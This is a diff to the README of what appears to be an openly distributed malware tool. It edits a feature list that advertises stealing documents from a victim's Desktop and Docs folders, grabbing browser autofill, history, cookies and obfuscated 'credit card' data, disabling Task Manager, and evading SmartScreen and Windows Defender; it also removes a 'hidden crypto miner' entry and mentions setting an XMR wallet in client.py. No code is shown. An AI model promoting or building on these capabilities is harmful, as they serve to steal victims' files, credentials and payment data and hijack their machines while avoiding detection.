@@ -120,7 +120,7 @@ Edit client.py and set your XMR wallet (don't do it if you wan't to support me !
 
 💚 Disable Task Manager
 
-💚 Steal .txt, .pdf, .docx files in Desktop directory
+💚 Steal .txt, .pdf, .docx files in Desktop/Docs directory
 
 💚 Browser autofill, history, C r 3 d 1 t c 4 r d grabber
 
@@ -135,9 +135,8 @@ Edit client.py and set your XMR wallet (don't do it if you wan't to support me !
 💚 Windows/Linux Browser cookies
 
 💚 undetected by Smartscreen and Windows defender
- 
-💚 Windows/Linux hidden crypto miner
- 
+
+
 💚 And much more...
 
 
